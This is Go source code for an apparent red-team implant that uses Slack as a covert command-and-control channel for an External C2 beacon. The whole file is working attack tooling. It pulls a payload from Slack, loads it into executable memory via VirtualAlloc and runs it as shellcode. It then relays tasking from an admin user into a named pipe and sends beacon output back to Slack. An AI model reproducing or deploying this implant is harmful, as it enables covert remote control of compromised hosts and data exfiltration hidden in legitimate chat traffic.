package main

import (
	"ExternalC2/pkg/ExternalC2Go"
	"ExternalC2/pkg/SlackBot"
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"github.com/google/uuid"
	"github.com/nlopes/slack"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	GLOBAL_SLEEP_FLOOR = 5
	GLOBAL_SLEEP_CEIL = 10
	ADMIN_UNAME          = ""
	MEMCOMMIT            = 0x1000
	MEMRESERVE           = 0x2000
	PAGEEXECUTEREADWRITE = 0x40
	info_format          = `arch=%s|pipename=%s|block=%d`
)

var (
	ERR_COUNT = 0

	IsInit       = true
	kernel32     = syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc = kernel32.NewProc("VirtualAlloc")

	Client *slack.Client
	RTM    *slack.RTM
	UID    uuid.UUID

	ErrChan = make(chan error)

	MessageToSlack = make(chan ExternalC2Go.EC2Message)
	MessageToPipe  = make(chan ExternalC2Go.EC2Message)

	ClientBot *SlackBot.SlackBot

	CHANNEL = ""
	TOKEN   = ""

	PipeConn net.Conn
)

func main() {
	Client = slack.New(TOKEN)
	RTM = Client.NewRTM()
	ClientBot = SlackBot.NewSlackBot(*Client, *RTM)
	log.Println("[i] Sarting RTM manage routine")
	UID = uuid.New()
	go RTM.ManageConnection()
	payload := getStage()
	// launch shellcode
	log.Println("[i] launching shellcode")
	startShellcode(payload)
	ExternalC2Go.StartPipe(`d00td00tStrongBones`, 100*time.Millisecond)
	PipeConn = ExternalC2Go.PipeConn
	go ListenPipe()
	ListenSlack()
}

func ListenPipe() {
	go func() {
		for {
			readFrame()
			if ERR_COUNT > 10 {
				log.Println("[--] Critical, max errors reached, shutting down")
				os.Exit(0)
			}
		}
	}()
	for {
		top := <- ExternalC2Go.FromPipe
		go dispatch(top)
	}
}

func dispatch(m ExternalC2Go.EC2Message) {

	timeSleep := time.Duration((rand.Int() % GLOBAL_SLEEP_CEIL) + GLOBAL_SLEEP_FLOOR) * time.Second
	time.Sleep(timeSleep)
	
	if m.Length > slack.MaxMessageTextLength {
		sendFile(m)
		return
	}
	sendMessage(m)
}

func sendFile(m ExternalC2Go.EC2Message) {
	//base64 encode the content before we send to slack
	encoded := base64.StdEncoding.EncodeToString(m.Contents)
	params := slack.FileUploadParameters{
		Title:    UID.String(),
		Content:  encoded,
		Filetype: "auto",
		Filename: UID.String(),
		Channels: []string{CHANNEL},
	}
	if _, err := Client.UploadFile(params); err != nil {
		log.Println(err)
	}
}

func sendMessage(m ExternalC2Go.EC2Message) {
	encoded := base64.StdEncoding.EncodeToString(m.Contents)
	text := UID.String() + ":" + encoded
	msg := RTM.NewOutgoingMessage(text, CHANNEL)
	RTM.SendMessage(msg)
}

func alloc(size uintptr) (uintptr, error) {
	ptr, _, err := virtualAlloc.Call(0, size, MEMRESERVE|MEMCOMMIT, PAGEEXECUTEREADWRITE)
	if ptr == 0 {
		return 0, err
	}
	return ptr, nil
}

func getInfo() string {
	arch := ""
	_ = arch
	switch runtime.GOARCH {
	case "amd64":
		arch = "x64"
	case "386":
		arch = "x86"
	default:
		os.Exit(0)
	}

	pipename := "d00td00tStrongBones"
	block := 100

	initString := fmt.Sprintf(info_format, arch, pipename, block)
	return initString
}

func getStage() []byte {
	infoString := getInfo()
	encoded := base64.StdEncoding.EncodeToString([]byte(infoString))
	// send the init method
	om := ClientBot.RTM.NewOutgoingMessage(UID.String()+":"+encoded, CHANNEL)
	ClientBot.RTM.SendMessage(om)

	// loop until we get the stage file
	for {
		select {
		case msg := <-RTM.IncomingEvents:

			switch ev := msg.Data.(type) {
			case *slack.FileSharedEvent:
				sFile, _, _, err := Client.GetFileInfo(ev.FileID, 1, 1)

				if err != nil {
					log.Println(err)
					continue
				}

				if strings.Compare(sFile.Title, UID.String()) == 0 {

					var buf bytes.Buffer
					bufWriter := bufio.NewWriter(&buf)

					err = Client.GetFile(sFile.URLPrivateDownload, bufWriter)

					if err != nil {
						log.Println(err)
					}
					decoded_payload, err := base64.StdEncoding.DecodeString(string(buf.Bytes()))
					if err != nil {
						log.Fatal(err)
					}
					return decoded_payload
				}
			}
		}
	}
}

func startShellcode(payload []byte) {
	ptr, err := alloc(uintptr(len(payload)))
	if err != nil {
		os.Exit(69)
	}
	payload_buffer := (*[890000]byte)(unsafe.Pointer(ptr))

	for i := 0; i < len(payload); i++ {
		payload_buffer[i] = payload[i]
	}

	// new thread bc why not
	go syscall.Syscall(ptr, 0, 0, 0, 0)
}

func ListenSlack() {
	for {
		select {
		case msg := <-RTM.IncomingEvents:
			info := RTM.GetInfo()

			log.Printf("[d] Incoming Message Type: %T\n", msg.Data)
			switch ev := msg.Data.(type) {
			case *slack.MessageEvent:
				log.Println("[i] Handling message event in new thread")
				go HandleMessage(ev, info)
			case *slack.FileSharedEvent:
				go HandleFile(ev, info)
			}
		}
	}
}

func HandleMessage(ev *slack.MessageEvent, info *slack.Info) {
	if strings.Compare(ev.User, ADMIN_UNAME) == 0 {
		res := strings.Split(ev.Text, ":")
		uid, err := uuid.Parse(res[0])
		if err != nil {
			log.Println(err)
			return
		}
		if UID != uid {
			log.Println("[i] ignoring tasking not for us")
			return
		}
		// make a new EC2Message
		decoded, err := base64.StdEncoding.DecodeString(res[1])
		if err != nil {
			log.Println(err)
			return
		}
		msg := ExternalC2Go.NewEC2Message(decoded, uid)
		writeMessage(*msg)
	}
}

func HandleFile(ev *slack.FileSharedEvent, info *slack.Info) {
	fInfo,_,_, err := RTM.GetFileInfo(ev.FileID,1,1)
	if err != nil{
		log.Println(err)
		return
	}
	// make sure it's from the admin user
	if strings.Compare(fInfo.User, ADMIN_UNAME) == 0 {
		// get the UID and make sure it's for us
		uidStr := fInfo.Title
		// try to parse and just return if you can't
		uid, err := uuid.Parse(uidStr)
		if err != nil {
			log.Println(err)
			return
		}
		// download the file
		var buf bytes.Buffer
		bufWriter := bufio.NewWriter(&buf)
		err = RTM.GetFile(fInfo.URLPrivateDownload, bufWriter)
		if err != nil {
			log.Println(err)
			return
		}


		data := buf.Bytes()
		decoded, err := base64.StdEncoding.DecodeString(string(data))
		if err != nil {
			log.Println(err)
			return
		}

		msg := ExternalC2Go.NewEC2Message(decoded, uid)
		writeMessage(*msg)
	}
}

func readFrame() {
	frameSize := make([]byte, 4)

	_, err := PipeConn.Read(frameSize)

	if err != nil {
		if err != io.EOF {
			log.Println(err)
			ERR_COUNT++
			return
		}
	}

	numSize := binary.LittleEndian.Uint32(frameSize)
	log.Printf("**READ FRAME FROM CONNECTION")
	log.Printf("FRAME SIZE: %d\n", numSize)

	var buf []byte


	TotalBytesRead := uint32(0)

	for TotalBytesRead < numSize {
		tmp := make([]byte, numSize)
		n, err := PipeConn.Read(tmp)
		if err != nil {
			log.Println("Couldn't read buffer from pipe with error:")
			log.Fatal(err)
		}
		if uint32(n) == numSize {
			buf = tmp // creates a deep copy?
			break
		}

		TotalBytesRead += uint32(n)

		buf = append(buf, tmp[0:n]...)
	}
	msg := ExternalC2Go.NewEC2Message(buf, UID)
	ExternalC2Go.FromPipe <- *msg
}

func writeMessage(m ExternalC2Go.EC2Message) {
	if m.Length > ExternalC2Go.BEACON_MAX_LEN {
		m.Length = ExternalC2Go.BEACON_MAX_LEN
		return
	}

	// first  write the 4B size
	log.Printf("[d] ** Sending Size Frame: %v\n", m.LengthLittleEndian)

	nSent, conErr := PipeConn.Write([]byte(m.LengthLittleEndian))

	// if we get an error send it to the error chan and log it
	if conErr != nil {
		ErrChan <- conErr
		log.Println(conErr)
		return
	}

	if nSent != len(m.LengthLittleEndian) {
		log.Printf("[-] Sent longer data than the frame length of 4B?: len - %d\n", nSent)
	}

	nSent, conErr = PipeConn.Write(m.Contents[:m.Length])
	if conErr != nil {
		ErrChan <- conErr
		log.Println(conErr)
		return
	}

	if nSent != len(m.Contents) {
		log.Printf("[-] Sent longer data than the frame data of len - %d, actual %d\n", nSent, len(m.Contents))
	}
}
